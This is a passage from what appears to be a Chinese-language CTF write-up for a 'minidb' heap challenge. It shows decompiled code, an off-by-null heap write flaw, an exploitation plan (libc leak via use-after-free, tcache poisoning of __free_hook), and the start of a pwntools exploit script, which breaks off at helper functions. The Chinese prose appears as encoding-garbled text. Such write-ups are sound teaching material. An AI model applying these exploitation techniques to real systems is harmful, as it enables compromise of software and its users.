<span class="hljs-number">2u</span>:<br>        v3 = sub_2080();<br>        <span class="hljs-keyword">if</span> ( v3 )<br>          sub_1451(v3);<br>        v3 = <span class="hljs-number">0LL</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        sub_21C1();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        sub_23EA();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        sub_247F();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">goto</span> LABEL_6;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v2 != <span class="hljs-number">666</span> );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;See you next time~&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­æ•°æ®åº“çš„åˆ›å»ºä¼šåˆ†é…ä¸¤ä¸ª chunkï¼Œä¸€ä¸ªç”¨ä½œæ•°æ®åº“æœ¬ä½“ï¼Œå¦ä¸€ä¸ªç”¨ä½œæ•°æ®åº“çš„åå­—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1D38</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-130h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-12Ch]</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+8h] [rbp-128h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+Ch] [rbp-124h]</span><br>  <span class="hljs-type">void</span> **v5; <span class="hljs-comment">// [rsp+10h] [rbp-120h]</span><br>  <span class="hljs-type">void</span> *ptr; <span class="hljs-comment">// [rsp+18h] [rbp-118h]</span><br>  <span class="hljs-type">char</span> s2[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+128h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( !dword_6088 )<br>    dword_6088 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( dword_608C &lt;= <span class="hljs-number">4</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !qword_6060[i] )<br>      &#123;<br>        v5 = (<span class="hljs-type">void</span> **)&amp;qword_6060[i];<br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>    ptr = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1uLL</span>, <span class="hljs-number">0x810</span>uLL);<br>    <span class="hljs-keyword">if</span> ( ptr )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input the name of database: &quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%255s&quot;</span>, s2);<br>      <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">4</span>; ++j )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( qword_6060[j] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(*(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)(qword_6060[j] + <span class="hljs-number">8LL</span>), s2) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] There&#x27;s already another database with the same name!\x1B[0m&quot;</span>);<br>          <span class="hljs-keyword">goto</span> LABEL_24;<br>        &#125;<br>      &#125;<br>      v4 = <span class="hljs-built_in">strlen</span>(s2);<br>      *((_QWORD *)ptr + <span class="hljs-number">1</span>) = <span class="hljs-built_in">malloc</span>(v4 + <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> ( *((_QWORD *)ptr + <span class="hljs-number">1</span>) )<br>      &#123;<br>        <span class="hljs-built_in">strcpy</span>(*((<span class="hljs-type">char</span> **)ptr + <span class="hljs-number">1</span>), s2);<br>        *(_BYTE *)(*((_QWORD *)ptr + <span class="hljs-number">1</span>) + v4) = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now you can set the type of your databse. Here&#x27;s available choices:&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. int32 to str[128]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. int64 to str[128]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. int32 to str[256]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. int64 to strr[256]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;(Note that the string should end with a &#x27;\\0&#x27;, so the max length of input is 127/255)&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input the type of database: &quot;</span>);<br>        __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v1);<br>        <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">4</span> &amp;&amp; v1 )<br>        &#123;<br>          *(_DWORD *)ptr = v1;<br>          *v5 = ptr;<br>          ++dword_608C;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Succesfully create a new database with name \&quot;%s\&quot;!\n&quot;</span>, s2);<br>          <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v8;<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid type of database!\x1B[0m&quot;</span>);<br>        <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)ptr + <span class="hljs-number">1</span>));<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Failed to allocate space for db name!\x1B[0m&quot;</span>);<br>      &#125;<br>LABEL_24:<br>      <span class="hljs-built_in">free</span>(ptr);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Failed to allocate space for db!\x1B[0m&quot;</span>);<br>    &#125;<br>    *v5 = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] You&#x27;ve already got too many databases!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v8;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚å †èœå•åˆ™æä¾›äº†å¯¹æ•°æ®åº“å†…é”®å€¼å¯¹æ•°æ®çš„å¢åŠ ã€æŸ¥è¯¢ã€æ›´æ–°ã€åˆ é™¤æ“ä½œï¼š</p><p><img src="https://s2.loli.net/2023/07/12/yEmj24xGUVwt7Os.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_1451</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    sub_13FE();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v2);<br>    v3 = v2;<br>    <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">666</span> )<br>      <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">666</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>      &#123;<br>        sub_1C47(a1);<br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">4</span> )<br>      &#123;<br>        <span class="hljs-keyword">switch</span> ( v3 )<br>        &#123;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            sub_1A81(a1);<br>            <span class="hljs-keyword">continue</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            sub_1712(a1);<br>            <span class="hljs-keyword">continue</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            sub_19BD(a1);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid choice!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v3 != <span class="hljs-number">666</span> );<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­åˆ¤æ–­æ˜¯å¦å­˜åœ¨é‡å¤é”®çš„é€»è¾‘å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹å‡ºæ•°æ®å‚¨å­˜æ–¹å¼æ˜¯å“ˆå¸Œè¡¨ + å•å‘é“¾è¡¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">_QWORD *__fastcall <span class="hljs-title function_">sub_168D</span><span class="hljs-params">(__int64 a1, __int64 a2, _QWORD *a3)</span><br>&#123;<br>  _QWORD *v4; <span class="hljs-comment">// [rsp+28h] [rbp-10h]</span><br>  _QWORD *v5; <span class="hljs-comment">// [rsp+30h] [rbp-8h]</span><br><br>  v4 = *(_QWORD **)(a1 + <span class="hljs-number">8</span> * ((<span class="hljs-type">unsigned</span> __int8)a2 + <span class="hljs-number">2LL</span>)); <span class="hljs-comment">/* hash to %256 */</span><br>  v5 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( v4 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( a2 == v4[<span class="hljs-number">1</span>] )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( a3 )<br>        *a3 = v5;<br>      <span class="hljs-keyword">return</span> v4;<br>    &#125;<br>    v5 = v4;<br>    v4 = (_QWORD *)*v4;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±æ­¤æˆ‘ä»¬å¯ä»¥é€†å‘å‡ºæ•°æ®åº“ä¸é”®å€¼å¯¹çš„ç»“æ„ä½“å®šä¹‰åˆ†åˆ«å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> *<span class="hljs-title">next</span>;</span><br>    <span class="hljs-type">int64_t</span> key;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">0</span>]; <span class="hljs-comment">/* 128 or 256 here */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">database</span> &#123;</span><br>    <span class="hljs-type">int64_t</span> type;<br>    <span class="hljs-type">char</span> *name;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> *<span class="hljs-title">kv</span>[256];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>æ¼æ´ç‚¹åœ¨äºç¼–è¾‘é”®å€¼å¯¹çš„åŠŸèƒ½ä¸­ï¼Œè¿™é‡Œåœ¨è¯»å–ç”¨æˆ·è¾“å…¥åä¼šå…ˆåœ¨é”®å€¼å¯¹æœ«å°¾æ”¾ç½® <code>&#39;\0&#39;</code> åå†æ£€æŸ¥é•¿åº¦ï¼Œè™½ç„¶é™åˆ¶äº†æœ€å¤§è¾“å…¥é•¿åº¦ä¸º 255 å­—ç¬¦ï¼Œä½†é”®å€¼å¯¹çš„å€¼é•¿åº¦æœ‰ <code>128</code> å’Œ <code>256</code> ä¸¤ç§ç±»å‹ï¼Œ<strong>å¯¹äºå‰è€…è€Œè¨€æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®Œæˆä¸€ä¸ªå †ä¸Šè¶Šç•Œå†™ \0</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_1A81</span><span class="hljs-params">(_DWORD *a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-224h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+20h] [rbp-220h] BYREF</span><br>  __int64 v4; <span class="hljs-comment">// [rsp+28h] [rbp-218h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">520</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-210h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+238h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( a1 )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the key: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v3);<br>    v4 = sub_168D(a1, v3, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-keyword">if</span> ( v4 )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the new value: &quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%255s&quot;</span>, s);<br>      v2 = <span class="hljs-built_in">strlen</span>(s);<br>      *(_BYTE *)(v4 + v2 + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>; <span class="hljs-comment">/* vulnerability here */</span><br>      <span class="hljs-keyword">if</span> ( (*a1 == <span class="hljs-number">1</span> || *a1 == <span class="hljs-number">2</span>) &amp;&amp; v2 &gt; <span class="hljs-number">127</span> || (*a1 == <span class="hljs-number">3</span> || *a1 == <span class="hljs-number">4</span>) &amp;&amp; v2 &gt; <span class="hljs-number">255</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] The length of new value is TOOOOOO LOOOOONG!\x1B[0m&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span> *)(v4 + <span class="hljs-number">16</span>), s, v2);<br>        *(_BYTE *)(v4 + v2 + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Succesfully update the value of specific key!&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Key NOT FOUND!\x1B[0m&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Runtime error! No database provided!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ç”±äºæ˜¯ç­¾åˆ°é¢˜éš¾åº¦æ‰€ä»¥è§£æ³•æ¯”è¾ƒä¿—ï¼Œç®€å•é£æ°´ä¸€ä¸‹åˆ©ç”¨è¶Šç•Œå†™æ”¹ä¸€ä¸ªæ•°æ®åº“çš„ <code>database-&gt;name</code> æŒ‡å‘å¦ä¸€ä¸ª chunkï¼Œé‡Šæ”¾è¿› unsorted bin åˆ©ç”¨ UAF read æ³„éœ² libc åé‡å–é‡Šæ”¾å› tcache ååŠ«æŒ next æŒ‡é’ˆæ‰“ <code>__free_hook</code> å³å¯</p><blockquote><p>æ„Ÿè§‰ä¹Ÿæ²¡å•¥å¥½è¯´çš„ï¼Œæ¯•ç«Ÿæœ¬æ¥å°±æ˜¯ç­¾åˆ°é¢˜éš¾åº¦ï¼ˆ</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-comment"># p = process(&#x27;./minidb&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span>, value:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the value: &quot;</span>)<br>    p.sendline(value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">query_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span>, value:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the new value: &quot;</span>)<br>    p.sendline(value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit_db</span>():<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;666&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_db</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>:<span class="hljs-built_in">int</span>, name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the type of database: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">use_db</span>(<span class="hljs-params">name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_db</span>(<span class="hljs-params">name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span 